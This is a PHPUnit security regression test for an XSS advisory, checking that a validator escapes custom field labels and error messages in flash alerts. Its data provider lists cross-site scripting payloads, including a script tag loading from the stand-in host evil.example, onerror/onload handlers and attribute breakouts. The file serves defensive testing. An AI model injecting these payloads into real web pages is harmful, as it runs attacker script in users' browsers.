<?php

namespace Tests\Unit\Validators;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

/**
 * GHSA-xvpx-fwvm-346g: Validator::create_error_text() interpolated the custom field label and the
 * error message into the flash alert HTML unescaped, so a stored label such as
 * <script>...</script> executed whenever a validation error for that field was displayed.
 *
 * The real Validator class runs in a child process (tests/Support/validator-error-text.php).
 */
class CustomFieldValidationSecurityTest extends TestCase
{
    /**
     * @return array<string, array{string}>
     */
    public static function hostileText(): array
    {
        return [
            'script src'         => ['<script src=//evil.example/x.js></script>'],
            'img onerror'        => ['<img src=x onerror=alert(1)>'],
            'svg onload'         => ['<svg onload=alert(1)>'],
            'attribute breakout' => ['" onmouseover="alert(1)'],
            'single quote'       => ["' onmouseover='alert(1)"],
            'anchor javascript'  => ['<a href="javascript:alert(1)">x</a>'],
            'entity smuggling'   => ['&lt;script&gt;alert(1)&lt;/script&gt;'],
            'format specifiers'  => ['%s %d %1$s %n'],
        ];
    }

    #[Test]
    #[DataProvider('hostileText')]
    public function it_escapes_a_hostile_custom_field_label(string $hostile): void
    {
        $out = $this->render([['label' => $hostile, 'error_msg' => 'invalid input']]);

        self::assertDoesNotMatchRegularExpression('/<(?!br \/>)/', $out, 'only the <br /> from nl2br may contain a "<": ' . $out);
        self::assertStringNotContainsString('"', $out, 'no attribute-breaking quote may survive');
        self::assertStringContainsString(self::expectedEscape($hostile), $out);
        self::assertStringStartsWith('Unable to process field ', $out);
    }

    #[Test]
    #[DataProvider('hostileText')]
    public function it_escapes_a_hostile_error_message(string $hostile): void
    {
        $out = $this->render([['label' => 'Birthday', 'error_msg' => $hostile]]);

        self::assertDoesNotMatchRegularExpression('/<(?!br \/>)/', $out, $out);
        self::assertStringContainsString(self::expectedEscape($hostile), $out);
        self::assertStringContainsString('Birthday', $out);
    }

    #[Test]
    public function it_lists_every_error_on_its_own_line_and_escapes_each(): void
    {
        $out = $this->render([
            ['label' => '<b>One</b>', 'error_msg' => 'invalid input'],
            ['label' => 'Two', 'error_msg' => '<i>bad</i>'],
            ['label' => 'Three', 'error_msg' => 'invalid input'],
        ]);

        self::assertSame(3, substr_count($out, 'Unable to process field'));
        self::assertSame(2, substr_count($out, '<br />'));
        self::assertStringContainsString('&lt;b&gt;One&lt;/b&gt;', $out);
        self::assertStringContainsString('&lt;i&gt;bad&lt;/i&gt;', $out);
        self::assertStringNotContainsString('<b>', $out);
        self::assertStringNotContainsString('<i>', $out);
    }

    #[Test]
    public function it_renders_a_legitimate_label_readably(): void
    {
        $out = $this->render([['label' => 'Geburtsdatum / Date of birth (日本語)', 'error_msg' => 'invalid input']]);

        self::assertSame('Unable to process field Geburtsdatum / Date of birth (日本語): invalid input', $out);
    }

    #[Test]
    public function it_returns_an_empty_string_when_there_are_no_errors(): void
    {
        self::assertSame('', $this->render([]));
    }

    /**
     * @param list<array{label: string, error_msg: string}> $errors
     */
    private function render(array $errors): string
    {
        $command = sprintf(
            '%s %s %s',
            escapeshellarg(PHP_BINARY),
            escapeshellarg(ROOT_PATH . '/tests/Support/validator-error-text.php'),
            escapeshellarg(base64_encode((string) json_encode($errors)))
        );

        $raw = (string) shell_exec($command . ' 2>&1');
        $decoded = json_decode($raw, true);

        self::assertIsArray($decoded, 'child process did not return JSON: ' . $raw);

        return $decoded['out'];
    }

    /**
     * The escaping the production helper is expected to apply, computed independently.
     */
    private static function expectedEscape(string $value): string
    {
        return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }
}
